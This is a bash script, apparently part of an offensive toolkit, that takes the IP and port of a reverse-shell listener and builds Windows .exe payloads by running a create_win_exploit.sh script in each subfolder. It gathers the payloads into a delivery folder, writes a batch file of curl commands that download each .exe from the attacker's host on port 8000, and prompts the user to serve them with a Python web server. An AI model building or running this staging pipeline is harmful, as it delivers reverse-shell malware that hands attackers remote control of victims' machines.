#!/bin/bash

###############################################################
# Check Arguments
###############################################################
if [ "$#" -ne 2 ]; then
    echo "this script expects two arguments"
    echo "please define ip and port of reverse shell host"
    echo "EXAMPLE -- ./create_all_exploits.sh 192.168.75.133 80"
    exit 
fi

###############################################################
# Create Delivery Folder
###############################################################
[[ -d ./delivery ]] || mkdir delivery

ls -al 
sleep 5

###############################################################
# Create Payloads
###############################################################
mydir=`pwd`
ls -al
sleep 5
for i in `ls -1|grep -v ".sh"`; do
	cd $mydir/$i
	echo "========= CREATE $i ==============="
	./create_win_exploit.sh $1 $2
	ls -al 
	ls -al ../
	ls -al ../delivery
	cp $mydir/$i/*.exe ../delivery/
done

###############################################################
# Create Download Script
###############################################################
cd $mydir
ls -al 
sleep 5
for i in `ls -1 ./delivery`; do echo "curl http://$1:8000/delivery/$i -o $i"; done > download-exe.bat
echo "run python3 -m http.server 8000" 

echo "DONE"



